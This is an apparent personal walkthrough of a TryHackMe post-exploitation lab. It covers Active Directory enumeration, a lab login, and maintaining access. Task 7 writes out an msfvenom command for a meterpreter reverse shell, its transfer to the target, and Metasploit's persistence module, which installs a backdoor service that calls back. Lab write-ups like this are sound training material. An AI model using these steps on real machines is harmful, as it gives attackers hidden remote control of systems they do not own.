<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Post Exploitation Basics</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Post Exploitation Basics</h1><br/><p><strong>THM Room: Post-Exploitation Basics</strong></p><p></p><p>This room will cover all of the basics of post-exploitation; we&#39;ll talk everything from <strong>post-exploitation enumeration with powerview</strong> <strong>and</strong> <strong>bloodhound</strong>, <strong>dumping hashes and golden ticket attacks with mimikatz</strong>, <strong>basic information gathering using windows server tools and logs</strong>, and then we will wrap up this room talking about the basics of <strong>maintaining access</strong> with the <strong>persistence metaploit module</strong> and creating a <strong>backdoor</strong> into the machine to get an instant meterpreter shell if the system is ever shutdown or reset.</p><p></p><p></p><p><strong>Task - 2: Enumeration with Powerview</strong></p><p></p><p>Use <strong>Powerview</strong> from <strong>CybeXRay Guides -----→ Active Directory ------→ Tools</strong> -----→ <strong>Powerview</strong></p><p></p><p>This can solve all the questions of Task - 2</p><p></p><p></p><p><strong>Task - 3: Enumeration with BloodHound</strong></p><p></p><p>Use <strong>Bloodhound</strong> from <strong>CybeXRay Guides -----→ Active Directory ------→ Tools</strong> -----→ <strong>Bloodhound</strong></p><p></p><p>This can solve all the questions of Task - 3</p><p></p><p><strong>Task - 4 &amp; Task -5: Mimikatz</strong></p><p></p><p>Use <strong>mimikatz</strong> from <strong>CybeXRay Guides -----→ Active Directory ------→ Tools</strong> -----→ <strong>mimikatz</strong></p><p></p><p><strong>Task - 6: Enumeration with Server Manager</strong></p><p></p><p>Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.</p><p></p><p>The only way to access the server manager is to rdp into the server and access the server over an rdp connection</p><p></p><p>We&#39;ll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager</p><p></p><p>This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.</p><p></p><p><strong>Connect to the VM with RDP:</strong></p><p></p><p>Your machine IP is 10.10.33.48</p><p>Username: Administrator</p><p>Password: P@$$W0rd</p><p>Domain Name: CONTROLLER</p><p></p><p></p><p></p><p><strong>Enumeration w/ Server Manager</strong></p><p></p><p>This is what Windows Server Manager will look when you first open it up the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers. The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick.</p><p></p><p>Dont worry about the AD CS, AD DS, DNS, or File and Storage Services these are setup for exploitation of the active directory and dont have much use for post-exploitation</p><p></p><p><img src="images/158-1.png" alt="images/158-1.png" /></p><p></p><p>Navigate to the tools tab and select the Active Directory Users and Computers</p><p></p><p><img src="images/158-2.png" alt="images/158-2.png" /></p><p></p><p>This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers</p><p></p><p>Some sys admins dont realize that you as an attacker can see the descriptions of user accounts so they may set the service accounts passwords inside of the description look into the description and find what the SQL Service password is</p><p></p><p><strong>Task - 7 : Maintaining Access</strong></p><p></p><p>There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.</p><p></p><p>There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.</p><p></p><p>This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.</p><p></p><p></p><p><strong>Generating a Payload with msfvenom﻿</strong></p><p></p><p>1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe this will generate a basic windows meterpreter reverse tcp shell</p><p></p><p><img src="images/158-3.png" alt="images/158-3.png" /></p><p></p><p>2.) Transfer the payload from your attacker machine to the target machine.</p><p></p><p>Transfer the <strong>shell.exe</strong> to windows machine using <strong>scp</strong>.</p><p>scp /home/cybex/lab/active_directory_tools/bloodhound_loots/shell.exe administrator@10.10.33.48:/Users/Administrator/Downloads/</p><p></p><p>3.) use <strong>exploit/multi/handler</strong> - this will create a listener on the port that you set it on.</p><p>4.) Configure our payload to be a windows meterpreter shell: <strong>set payload windows/meterpreter/reverse_tcp</strong></p><p>5.) After setting your<strong> THM IP address</strong> as your &quot;<strong>LHOST</strong>&quot;, start the listener with <strong>run</strong></p><p>6.)  <strong>Executing</strong> the <strong>binary</strong> on the <strong>windows machine</strong> will give you a <strong>meterpreter shell</strong> back on your host - let&#39;s return to that</p><p>7.) Verify that we&#39;ve got a meterpreter shell, where we will then <strong>background</strong> it to run the <strong>persistence module</strong>.</p><p></p><p><strong>Run the Persistence Module</strong></p><p></p><p>1.) use <strong>exploit/windows/local/persistence</strong> this module will send a payload every 10 seconds in default however you can set this time to anything you want</p><p>2.) set session 1 set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)</p><p></p><p></p><p><img src="images/158-4.png" alt="images/158-4.png" /></p><p></p><p>If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.</p><p></p><p><strong>Note:</strong> The module also tells how to remove persistence.</p><p>Clean Up Meterpreter RC file:</p><p><strong>Just cat the contents and run it inside a meterpreter session to remove persistence.</strong></p><p></p><p></p><p><img src="images/158-5.png" alt="images/158-5.png" /></p><p></p><p>Here you can see the session die however the second we run the handler again we get a meterpreter shell back thanks to the persistence service.</p><p></p><p>There are other ways of maintaining access such as adding users and rootkits however I will leave you to do your own research and labs on those topics.</p></div>
</body>
</html>
